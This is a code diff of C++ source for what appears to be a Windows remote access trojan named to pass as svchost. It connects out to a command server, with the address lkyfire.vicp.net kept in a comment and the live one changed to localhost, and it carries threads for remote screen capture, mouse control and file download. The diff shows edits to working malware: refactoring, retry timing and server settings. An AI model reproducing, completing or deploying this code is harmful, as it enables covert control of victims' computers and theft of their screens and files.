@@ -1,10 +1,6 @@
 #include "stdafx.h"
 #include "svchost.h"
 
-#pragma comment(lib, "msvcrt.lib")
-#pragma comment(linker,"/NODEFAULTLIB:libcmt.lib")
-#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
-
 #define LxProc
 #define LxFile
 #define LxScreem
@@ -43,7 +39,7 @@ struct MODIFY_DATA
 
 SOCKET MainSocket;
 HMODULE DllHandle;
-XScreenXor* pScreenXor;
+float ScreenRadio = 1;
 
 unsigned long _stdcall resolve(char *host)
 {
@@ -123,12 +119,8 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	EncryptData((unsigned char *)&m_SysInfo, sizeof(SysInfo), modify_data.dwVipID);	//用产品ID号加密
 
 	MsgHead msgHead;
-	char chBuffer[4096];
-
 	msgHead.dwCmd = SOCKET_CONNECT;
 	msgHead.dwSize = sizeof(SysInfo);
-
-	memcpy(chBuffer, &m_SysInfo, sizeof(SysInfo));
 
 	if ( !SendMsg(MainSocket, (char *)&m_SysInfo, &msgHead) )
 	{
@@ -137,9 +129,11 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 		return 1; //send socket type error
 	}
 
+	CHAR chBuffer[4096];
+
 	while (1)
 	{
-		if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead) )
+		if ( !RecvMsg(MainSocket, chBuffer, &msgHead) )
 		{
 			MsgErr("Can't Recv");
 			shutdown(MainSocket, 0x02);
@@ -299,12 +293,11 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			case CMD_MOUSEMOVE:	//WM_MOUSEMOVE
 			{
 				//OpenUserDesktop();
-				float Radio = pScreenXor->Radio;
 
 				POINT pt;
 				pt.x = msgHead.dwExtend1;
 				pt.y = msgHead.dwExtend2;
-				SetCursorPos(pt.x * Radio, pt.y * Radio);
+				SetCursorPos(pt.x * ScreenRadio, pt.y * ScreenRadio);
 			}
 			break;
 
@@ -511,10 +504,11 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 
 	////////////////////////////////////////
 	XScreenXor m_ScreenXor;
-	pScreenXor = &m_ScreenXor;
 
 	m_ScreenXor.SetColor(nColor);//设置位图颜色
 	m_ScreenXor.InitGlobalVar();
+
+	ScreenRadio = m_ScreenXor.Radio; //Radio info for MouseMove Msg
 
 	msgHead.dwCmd = SOCKET_SCREEN;
 	msgHead.dwSize = 0;
@@ -799,7 +793,6 @@ DWORD _stdcall FileDownThread(LPVOID lParam)
 	HANDLE hDownFile = INVALID_HANDLE_VALUE;
 	DWORD  dwDownFileSize = 0, dwBytes;
 	BYTE   SendBuffer[4096];
-	int nRet =0 ;
 
 	//get download data
 	hDownFile = CreateFile(m_FileOpt.cScrFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
@@ -926,9 +919,9 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 	}
 	else
 	{
-		modify_data.ServerPort = 52512;		
-		//lstrcpy(modify_data.ServerAddr, "192.168.128.1");	//192.168.1.145
-		lstrcpy(modify_data.ServerAddr, "lkyfire.vicp.net");	//192.168.1.145
+		modify_data.ServerPort = 80;		
+		lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
+		//lstrcpy(modify_data.ServerAddr, "lkyfire.vicp.net");	//192.168.1.145
 	}
 
 	int state = 1;
@@ -950,11 +943,11 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		}
 		else if (state == 1) //Network Error
 		{
-			Sleep(10 * 1000);
+			Sleep(30 * 1000);
 		}
 		else if (state == -1) //Exit
 		{
-			//MsgErr("Exit Request");
+			DbpErr("Exit Request");
 			return -1;
 		}
 
@@ -1013,7 +1006,7 @@ OK:
 	WSADATA lpWSAData;
 	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
 
-	SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER(Errdo));
+	//SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER(Errdo));
 
 	RoutineMain(0);
 
